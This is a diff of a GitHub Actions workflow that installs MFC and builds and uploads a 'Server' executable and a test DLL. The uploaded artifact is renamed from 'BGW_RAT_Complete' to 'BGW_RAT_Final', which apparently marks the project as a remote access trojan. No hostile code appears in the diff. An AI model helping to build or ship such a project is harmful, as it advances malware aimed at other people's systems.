@@ -8,28 +8,22 @@ jobs:
     runs-on: windows-2022
     steps:
       - uses: actions/checkout@v4
-      
       - name: Setup MSBuild
         uses: microsoft/setup-msbuild@v2
-        
-      - name: Install MFC (自动选择路径)
+      - name: Install MFC
         shell: pwsh
         run: |
-          $vswhere = "C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe"
-          $installPath = & $vswhere -latest -property installationPath
-          $vsInstaller = "C:\Program Files (x86)\Microsoft Visual Studio\Installer\vs_installer.exe"
-          Start-Process -FilePath $vsInstaller -ArgumentList "modify", "--installPath", "$installPath", "--add", "Microsoft.VisualStudio.Component.VC.ATLMFC", "--quiet", "--norestart" -Wait
-          
-      - name: Build All Projects
+          $installPath = "C:\Program Files\Microsoft Visual Studio\2022\Enterprise"
+          Start-Process -FilePath "C:\Program Files (x86)\Microsoft Visual Studio\Installer\vs_installer.exe" -ArgumentList "modify", "--installPath", $installPath, "--add", "Microsoft.VisualStudio.Component.VC.ATLMFC", "--quiet", "--norestart" -Wait
+      - name: Build All Projects (强制ANSI编码)
         shell: cmd
         run: |
-          msbuild "${{ github.workspace }}\Server\Server.vcxproj" /p:Configuration=Release /p:Platform=x64 /p:PlatformToolset=v143 /p:PreprocessorDefinitions="_CRT_SECURE_NO_WARNINGS" /m
-          msbuild "${{ github.workspace }}\Server\TestDll.vcxproj" /p:Configuration=Release /p:Platform=x64 /p:PlatformToolset=v143 /p:PreprocessorDefinitions="_CRT_SECURE_NO_WARNINGS" /m
-          
+          msbuild "${{ github.workspace }}\Server\Server.vcxproj" /p:Configuration=Release /p:Platform=x64 /p:CharacterSet=MultiByte /p:PreprocessorDefinitions="_CRT_SECURE_NO_WARNINGS;_MBCS" /m
+          msbuild "${{ github.workspace }}\Server\TestDll.vcxproj" /p:Configuration=Release /p:Platform=x64 /p:CharacterSet=MultiByte /p:PreprocessorDefinitions="_CRT_SECURE_NO_WARNINGS;_MBCS" /m
       - name: Upload All EXE and DLL
         uses: actions/upload-artifact@v4
         with:
-          name: BGW_RAT_Complete
+          name: BGW_RAT_Final
           path: |
             Server\**\*.exe
             Server\**\*.dll
